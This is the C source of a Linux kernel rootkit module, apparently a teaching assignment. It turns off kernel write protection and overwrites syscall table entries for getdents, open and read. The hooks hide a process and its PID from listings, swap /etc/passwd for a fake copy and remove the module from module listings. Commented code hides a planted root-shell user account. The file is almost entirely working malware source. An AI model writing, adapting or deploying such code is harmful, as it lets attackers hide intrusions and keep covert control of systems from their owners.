#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/moduleparam.h>
#include <asm/uaccess.h>
#include <linux/init.h>
#define BUFFLEN 1024

//the global variable can be set with cmd line arguments when insmod the LKM in
static int currPID;
//setting the mechenism up
module_param(currPID,int, S_IRUSR|S_IWUSR );
MODULE_PARM_DESC(currPID, "pid of calling process.");
struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUFFLEN];
};
//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-3.13.0.77-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81059d90;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81059df0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81801400;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage int (*original_call_open)(const char *pathname, int flags);
asmlinkage ssize_t (*original_call_read)(int fd, void* buf, size_t count);
//Define our new sneaky version of the 'open' syscall
//the most important section to implement
asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
  char* hide = "sneaky_process";
  char hide_dir[16];
  int mem;
  int curr_mem;
  struct linux_dirent* td;
  sprintf(hide_dir, "%d", currPID);
  //printk(KERN_INFO "process directory is: %s\n", hide_dir);
  mem = original_call_getdents(fd, dirp, count);
  if(mem > 0){
    td = dirp;
    curr_mem = mem;
    while(curr_mem > 0){
      curr_mem = curr_mem - td->d_reclen;
      if(strcmp(td->d_name, hide) == 0 || strcmp(td->d_name, hide_dir) == 0){
	mem = mem - td->d_reclen;
	if(curr_mem){
	  memmove(td, (char*)td + td->d_reclen, curr_mem);
	}
      }else{
	td = (struct linux_dirent*)((char*)td + td->d_reclen);
      }
    }
    return mem;
  }else{
    return 0;
  }
}
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  if (strcmp(pathname,"/etc/passwd") == 0) {
    char fake_pathname[] = "/tmp/passwd";
    char *fake_pathname_ptr;
    fake_pathname_ptr = fake_pathname;
    /*if(copy_to_user(pathname, fake_pathname_ptr,  strlen(fake_pathname))){
      return -EFAULT;
      }*/
    copy_to_user(pathname, fake_pathname_ptr,  strlen(fake_pathname));
  }
  return original_call_open(pathname, flags);
}
 

asmlinkage ssize_t sneaky_sys_read(int fd, void* buf, size_t count){
  ssize_t cnt = original_call_read(fd, buf, count);
  char* search1 = "sneaky_mod";
  char* search2 = "(POX)";
  //char* search3 = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
  //char* search4 = "colord:x:105:113:colord colour management daemon,,,:/var/lib/colord:/bin/false";
  //char* needle;
  if (strstr(buf,search1) != NULL && strstr(buf, search2) != NULL) {
    char* tmp = buf;
    int cnt = strlen(tmp);
    int curr = 1;
    while(*tmp != '\n'){
      tmp++;
      curr++;
    }
    tmp++;
    int move = cnt - curr;
    memmove(buf, tmp, move);
  }
    //hide modified part in passwd when cat by modifying the read buf
  /*
  if (strstr(buf, search3) != NULL && (strstr(buf, search4) != NULL)) {
    needle = strstr(buf, search3);
    char* tmp2 = needle;
    int curr2 = 1;
    while(*tmp2 != '\n') {
      tmp2++;
      curr2++;
    }
    tmp2++;
    int count = 0;
    while (count < curr2) {
      needle[count] = '\0';
      count++;
    }
  }
  */
  return cnt;
}

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  //printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
  original_call_open = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
  original_call_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  //printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);
  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_getdents) = (unsigned long)original_call_getdents;
  *(sys_call_table + __NR_open) = (unsigned long)original_call_open;
  *(sys_call_table + __NR_read) = (unsigned long)original_call_read;
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

